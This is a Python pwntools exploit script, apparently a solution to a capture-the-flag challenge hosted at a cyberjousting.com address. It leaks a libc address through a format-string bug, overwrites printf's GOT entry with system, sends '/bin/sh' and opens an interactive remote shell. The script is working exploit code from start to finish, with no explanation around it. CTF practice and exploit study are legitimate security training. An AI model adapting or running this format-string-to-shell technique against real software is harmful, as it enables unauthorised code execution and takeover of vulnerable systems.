#!/usr/bin/env python3

from pwn import *

LOCAL_BINARY = "./src/all"
REMOTE_IP = "all.chal.cyberjousting.com"
REMOTE_PORT = 1348

#context.log_level = "debug"
elf = ELF(LOCAL_BINARY, checksec=False)
context.binary = elf

# 67d9e00d38d59674367ca4591666c67e5dfad9e4fdd3861a59d6f26ffea87f65  ./libc.so
# copied from the containerr with $ docker cp id:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so
libc = ELF("./libc.so")

READ_PLUS_0x17 = 0x1147e2

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote(REMOTE_IP, REMOTE_PORT)

p.sendline(b"%3$p")

leak = int(p.readline().decode(), 16)

libc.address = leak - READ_PLUS_0x17

log.success(f"libc: 0x{libc.address:x}")

payload = fmtstr_payload(6, {elf.got["printf"]: libc.sym["system"]})

p.sendline(payload)

p.sendline(b"/bin/sh")

p.clean()

p.interactive()
